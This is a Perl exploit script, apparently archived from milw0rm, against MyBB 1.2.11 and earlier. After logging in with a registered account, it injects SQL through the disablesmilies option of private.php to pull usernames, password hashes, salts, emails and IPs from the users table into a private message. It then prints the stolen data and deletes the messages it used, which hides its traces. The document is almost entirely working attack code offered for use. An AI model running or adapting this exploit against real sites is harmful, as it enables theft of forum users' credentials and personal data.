<html><head><title>MyBulletinBoard (MyBB) <= 1.2.11 private.php SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

#
# MyBB &lt;=1.2.11 SQL Injection Exploit based on http://www.waraxe.us/advisory-64.html
#
# Needs MySQL &gt;=4.1 and a valid registration.
#
# By F
#

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;
use HTML::Entities;

####

	print(&quot;\n&quot;);
	print(&quot;############################################################################\n&quot;);
	print(&quot;#                 MyBB &lt;=1.2.11 SQL Injection Exploit by F                 #\n&quot;);
	print(&quot;############################################################################\n&quot;);

if(@ARGV&lt;5){
	print(&quot;# Usage: perl mybb1211.pl host path user pass victim_uid [last_victim_uid] #\n&quot;);
	print(&quot;############################################################################\n&quot;);
	exit;
};

$host=&quot;http://&quot;.$ARGV[0];
$path=$ARGV[1];
$user=$ARGV[2];
$pass=$ARGV[3];
$vid1=$ARGV[4];

if(@ARGV&lt;=5){
	$vidn=$vid1;
}else{
	$vidn=$ARGV[5];
};

print(&quot;\n&quot;);
print(&quot; [~] Host: &quot;.$host.&quot;\n&quot;);
print(&quot; [~] Path: &quot;.$path.&quot;\n&quot;);
print(&quot; [~] User: &quot;.$user.&quot;\n&quot;);
print(&quot; [~] Pass: &quot;.$pass.&quot;\n&quot;);
print(&quot; [~] From  #&quot;.$vid1.&quot;\n&quot;);
print(&quot; [~] To    #&quot;.$vidn.&quot;\n&quot;);
print(&quot;\n&quot;);

####

# create $browser and $cookie_jar
$browser=LWP::UserAgent-&gt;new() or die(&quot; [-] Cannot create new UserAgent\n&quot;);
$cookie_jar=HTTP::Cookies-&gt;new();
$browser-&gt;cookie_jar($cookie_jar);

# try to log in
$result=$browser-&gt;post(
	$host.$path.&quot;member.php&quot;,
	Content=&gt;[
		&quot;action&quot;=&gt;&quot;do_login&quot;,
		&quot;username&quot;=&gt;$user,
		&quot;password&quot;=&gt;$pass,
		&quot;url&quot;=&gt;$host.$path.&quot;index.php&quot;,
		&quot;submit&quot;=&gt;&quot;Login&quot;,
	],
);

# check cookie
if($cookie_jar-&gt;as_string=~m/mybbuser=.*?;/){
	print(&quot; [+] Login successful\n&quot;);
}else{
	print(&quot; [-] Login unsuccessful\n&quot;);
	exit;
};

# try to get uid
$result=$browser-&gt;get($host.$path.&quot;usercp.php&quot;);

# check result
if($result-&gt;as_string=~m/member\.php\?action=profile&amp;amp;uid=([0-9]*?)&quot;/){
	$uid=$1;
	print(&quot; [+] Getting uid successful: &quot;.$uid.&quot;\n&quot;);
}else{
	print(&quot; [-] Getting uid unsuccessful\n&quot;);
	exit;
};

# construct exploit
$exploit =&quot;yes','0','0'),&quot;;
$exploit.=&quot;('&quot;.$uid.&quot;','&quot;.$uid.&quot;','&quot;.$uid.&quot;','1','haxx_result','0',concat('(haxx_start)',&quot;;
for($vid=$vid1;$vid&lt;=$vidn;$vid++){
	$exploit.=&quot;ifnull((select concat(uid,'-',username,':',password,':',salt,'::',email,'-',usergroup,'-',additionalgroups,'-',website,'-',regip,'(haxx_delim)') from mybb_users where uid=&quot;.$vid.&quot;),''),&quot;;
};
$exploit.=&quot;'(haxx_end)'),'&quot;.time().&quot;','0','no','yes&quot;;

# try to send exploit
$result=$browser-&gt;post(
	$host.$path.&quot;private.php&quot;,
	Content=&gt;[
		&quot;action&quot;=&gt;&quot;do_send&quot;,
		&quot;subject&quot;=&gt;&quot;haxx_message=&quot;.(1+rand(65536)),
		&quot;message&quot;=&gt;&quot;nuthin&quot;.(1+rand(65536)),
		&quot;to&quot;=&gt;$user,
		&quot;options[disablesmilies]&quot;=&gt;$exploit,
	],
);

# check if user is valid
if(	($result-&gt;as_string=~m/Your account has either been suspended or you have been banned from accessing this resource\./) ||
	($result-&gt;as_string=~m/You do not have permission to access this page\./) ||
	($result-&gt;as_string=~m/Your account may still be awaiting activation or moderation\./)
){
	print(&quot; [-] User has no permission to send private messages. This can happen if the user is suspended, banned, unactivated, or for other similar reasons.\n&quot;);
	exit;
};

# check the 5 minute cap
if($result-&gt;as_string=~m/You have already submitted the same private message to the same recipient within the last 5 minutes\./){
	print(&quot; [-] Unsuccessful attempt to fool MyBB with the 5 minute limit on sending private messages. Please run the exploit again.\n&quot;);
	exit;
};

# delete auxiliary message
$result=$browser-&gt;get($host.$path.&quot;private.php?fid=1&quot;);
if($result-&gt;as_string=~m/private\.php\?action=read&amp;amp;pmid=([0-9]*?)&quot;&gt;haxx_message=[0-9]*?&lt;/){
	print(&quot; [+] The auxiliary message was found and successfully deleted\n&quot;);
	$pmid=$1;
	$browser-&gt;get($host.$path.&quot;private.php?action=delete&amp;pmid=&quot;.$pmid);
}else{
	print(&quot; [-] Warning! The auxiliary message wasn't found and could not be deleted!\n&quot;);
};

# download and delete result message
if($result-&gt;as_string=~m/private\.php\?action=read&amp;amp;pmid=([0-9]*?)&quot;&gt;haxx_result&lt;/){
	print(&quot; [+] The result message was found. Getting hashes.\n\n&quot;);
	$pmid=$1;
	$result=$browser-&gt;get($host.$path.&quot;private.php?action=read&amp;pmid=&quot;.$pmid);
	if($result-&gt;as_string=~m/\(haxx_start\)(.*)\(haxx_end\)/s){
		$pm=$1;
		$pm=~s/\(haxx_delim\)/\n/g;
		$pm=~s/&lt;br \/&gt;//g;
		$pm=decode_entities($pm);
		print($pm);
	};
	$browser-&gt;get($host.$path.&quot;private.php?action=delete&amp;pmid=&quot;.$pmid);
}else{
	print(&quot; [-] The result message wasn't found. Exploit failed!\n&quot;);
	exit;
};

# milw0rm.com [2008-02-06]</pre></html>